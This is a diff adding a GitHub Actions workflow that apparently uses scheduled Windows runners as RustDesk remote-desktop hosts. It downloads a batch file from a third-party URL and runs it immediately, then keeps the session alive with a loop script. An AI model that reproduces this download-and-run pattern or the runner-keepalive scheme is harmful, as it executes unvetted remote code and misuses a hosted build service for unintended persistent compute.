@@ -1,0 +1,19 @@
+name: RustDesk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 */6 * * *' # Runs every 6 hours
+jobs:
+  build:
+    name: Start Building...
+    runs-on: windows-latest
+    timeout-minutes: 360
+    steps:
+    - name: Downloading & Installing Essentials
+      run: |
+        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/LilMok/RustDesk-Windows-Github-RDP/refs/heads/main/down.bat" -OutFile "Downloads.bat"
+        cmd /c Downloads.bat
+    - name: Show Website
+      run: cmd /c show.bat
+    - name: Time Counter
+      run: cmd /c loop.bat
